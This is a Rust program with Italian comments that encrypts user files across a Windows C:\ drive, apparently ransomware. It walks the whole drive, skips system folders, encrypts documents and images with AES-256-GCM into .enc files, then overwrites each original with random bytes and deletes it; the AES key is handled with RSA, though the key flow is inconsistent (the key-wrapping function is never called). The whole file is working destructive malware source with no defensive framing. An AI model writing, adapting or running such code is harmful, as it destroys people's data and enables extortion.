// Importa i trait necessari per usare AES-GCM
use aes_gcm::aead::{Aead, KeyInit};
// Importa il tipo AES256GCM, la chiave e il nonce
use aes_gcm::{Aes256Gcm, Key, Nonce};
// Importa generatori casuali
use rand::{RngCore, thread_rng};
// Importa i moduli RSA, inclusa la decodifica di chiavi private in formato PKCS#8
use rsa::{Oaep, RsaPrivateKey, RsaPublicKey, pkcs8::DecodePrivateKey, pkcs8::DecodePublicKey};
// Importa SHA256 per l'OAEP padding
use sha2::Sha256;
// Importa moduli standard per gestione file, errori, path
use std::error::Error;
use std::fs::{self, File};
use std::io::{BufWriter, Write};
use std::path::{Path, PathBuf};
// Per camminare ricorsivamente nella directory
use walkdir::WalkDir;

// Lista delle directory da escludere dalla cifratura (in minuscolo e in stile Windows)
const EXCLUDED_DIRS: [&str; 5] = [
    "\\windows\\",
    "\\program files\\",
    "\\program files (x86)\\",
    "\\system volume information\\",
    "\\appdata\\",
];

// Funzione che controlla se un file è valido per la cifratura
fn is_valid_file(entry: &walkdir::DirEntry, allowed_ext: &[&str]) -> bool {
    let path = entry.path();
    if !path.is_file() {
        return false; // Ignora se non è un file
    }

    // Converte il path in lowercase e stile Windows
    let path_str = path.to_string_lossy().to_lowercase().replace('/', "\\");

    // Controlla se il file si trova in una directory esclusa
    if EXCLUDED_DIRS.iter().any(|d| path_str.contains(d)) {
        return false;
    }

    // Verifica se l'estensione è tra quelle permesse
    path.extension()
        .and_then(|ext| ext.to_str())
        .map(|ext| allowed_ext.contains(&ext.to_lowercase().as_str()))
        .unwrap_or(false)
}

// Cifra il contenuto di un file con AES-GCM, e ritorna il nonce + payload cifrato
fn encrypt_file(path: &Path, cipher: &Aes256Gcm) -> Result<Vec<u8>, Box<dyn Error>> {
    let data = fs::read(path)?; // Legge il contenuto del file

    // Genera un nonce casuale da 12 byte
    let mut nonce_bytes = [0u8; 12];
    thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes); // Crea il nonce

    // Cifra i dati usando AES-GCM
    let encrypted = cipher
        .encrypt(nonce, &data[..])
        .map_err(|e| format!("Errore durante la cifratura: {}", e))?;

    // Combina nonce + dati cifrati
    let mut combined = nonce_bytes.to_vec();
    combined.extend_from_slice(&encrypted);

    Ok(combined)
}

// Sovrascrive un file con dati casuali e poi lo elimina
fn overwrite_and_delete(path: &Path) -> Result<(), Box<dyn Error>> {
    let len = fs::metadata(path)?.len().min(1024 * 1024); // Limita a 1MB per sicurezza
    let random_data: Vec<u8> = (0..len).map(|_| rand::random::<u8>()).collect(); // Genera dati casuali
    fs::write(path, &random_data)?; // Sovrascrive il file
    fs::remove_file(path)?; // Elimina il file
    Ok(())
}

// Scrive un buffer binario su file
fn write_file<P: AsRef<Path>>(path: P, data: &[u8]) -> Result<(), Box<dyn Error>> {
    let file = File::create(path)?; // Crea file
    let mut writer = BufWriter::new(file); // Bufferizzato per prestazioni
    writer.write_all(data)?; // Scrive tutti i dati
    Ok(())
}

// Crea un path "sicuro" per il file cifrato, evitando sovrascritture
fn safe_enc_path(original: &Path) -> PathBuf {
    let mut new_path = original.with_extension("enc"); // Cambia estensione
    let mut i = 1;
    while new_path.exists() {
        new_path = original.with_extension(format!("enc{}", i)); // Prova estensioni alternative
        i += 1;
    }
    new_path
}

// Cifra la chiave AES (aes_key) con la chiave pubblica RSA e la salva su file
fn encrypt_aes_key_with_rsa(public_key_path: &str, aes_key: &[u8]) -> Result<(), Box<dyn Error>> {
    let pem = fs::read_to_string(public_key_path)?; // Legge chiave pubblica
    let public_key = rsa::RsaPublicKey::from_public_key_pem(&pem)?; // Decodifica PEM
    let mut rng = thread_rng();
    let encrypted_key = public_key.encrypt(&mut rng, Oaep::new::<Sha256>(), aes_key)?; // Cifra chiave AES
    write_file("key.bin.enc", &encrypted_key)?; // Scrive su file
    Ok(())
}

// Decifra la chiave AES dal file usando la chiave privata RSA
fn decrypt_aes_key_with_rsa(private_key_path: &str) -> Result<Vec<u8>, Box<dyn Error>> {
    let pem = fs::read_to_string(private_key_path)?; // Legge chiave privata
    let private_key = RsaPrivateKey::from_pkcs8_pem(&pem)?; // Decodifica PEM
    let encrypted_key = fs::read("key.bin.enc")?; // Legge file cifrato
    let decrypted_key = private_key.decrypt(Oaep::new::<Sha256>(), &encrypted_key)?; // Decifra la chiave AES
    Ok(decrypted_key)
}

// Funzione principale: decifra chiave AES, poi cifra tutti i file validi ricorsivamente in C:\
fn run() -> Result<(), Box<dyn Error>> {
    let allowed_extensions = ["txt", "doc", "docx", "xls", "xlsx", "pdf", "jpg", "png"];

    let key_bytes = decrypt_aes_key_with_rsa("private.pem")?; // Recupera la chiave AES
    let key = Key::<Aes256Gcm>::from_slice(&key_bytes); // Crea oggetto chiave
    let cipher = Aes256Gcm::new(key); // Crea cifratore

    // Scansiona ricorsivamente C:\
    for entry in WalkDir::new("C:/").into_iter().filter_map(Result::ok) {
        if is_valid_file(&entry, &allowed_extensions) {
            let path = entry.path();
            println!("Cifratura in corso: {}", path.display());

            match encrypt_file(path, &cipher) {
                Ok(encrypted_data) => {
                    let new_path = safe_enc_path(path); // Evita sovrascrittura

                    // Scrive il file cifrato
                    if let Err(e) = write_file(&new_path, &encrypted_data) {
                        eprintln!(
                            "Errore durante la scrittura di {}: {}",
                            new_path.display(),
                            e
                        );
                        continue;
                    }

                    // Sovrascrive e cancella il file originale
                    if let Err(e) = overwrite_and_delete(path) {
                        eprintln!(
                            "Errore durante la cancellazione di {}: {}",
                            path.display(),
                            e
                        );
                        continue;
                    }
                }
                Err(e) => {
                    eprintln!("Errore durante la cifratura di {}: {}", path.display(), e);
                }
            }
        }
    }

    println!("Operazione completata.");
    Ok(())
}

// Entry point del programma
fn main() {
    if let Err(e) = run() {
        eprintln!("Errore: {}", e);
    }
}
